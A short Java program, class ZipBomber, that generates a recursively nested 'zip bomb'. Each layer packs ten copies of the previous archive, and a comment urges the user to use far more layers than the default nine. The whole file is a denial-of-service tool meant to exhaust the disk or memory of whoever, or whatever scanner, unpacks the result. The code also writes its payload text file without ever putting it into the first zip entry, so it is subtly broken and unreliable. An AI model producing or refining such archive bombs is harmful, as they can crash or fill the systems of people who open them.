import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipBomber {

	public static void main(String[] args) throws IOException {
		recursiveZipBomb(9); //Change this number to the number of layers you want the zip to be, preferably alot bigger
	}
	
	public static void recursiveZipBomb(int max) throws IOException {
		File f = new File("n.zip");
		f.createNewFile();
		ZipOutputStream z = new ZipOutputStream(new FileOutputStream("n.zip"));
		File g = new File("n.txt");
		g.createNewFile();
		BufferedWriter bw = new BufferedWriter(new FileWriter(g));
		for(int i = 0; i < 10000; i++) bw.write("00000000000");
		bw.close();
		ZipEntry ze = new ZipEntry("n.txt");
		z.putNextEntry(ze);
		z.closeEntry();
		z.close();
		recursiveZipBomb(0, max);
	}
	
	private static void recursiveZipBomb(int curr, int max) throws IOException {
		File f = new File("t.zip");
		f.createNewFile();
		ZipOutputStream z = new ZipOutputStream(new FileOutputStream("t.zip"));
		for(int i = 0; i < 10; i++) {
			z.putNextEntry(new ZipEntry("n" + i + ".zip"));
			z.write(Files.readAllBytes(new File("n.zip").toPath()));
			z.closeEntry();
		}
		z.close();
		new File("n.zip").delete();
		f.renameTo(new File("n.zip"));
		if(curr < max) recursiveZipBomb(curr+1, max);
	}

}
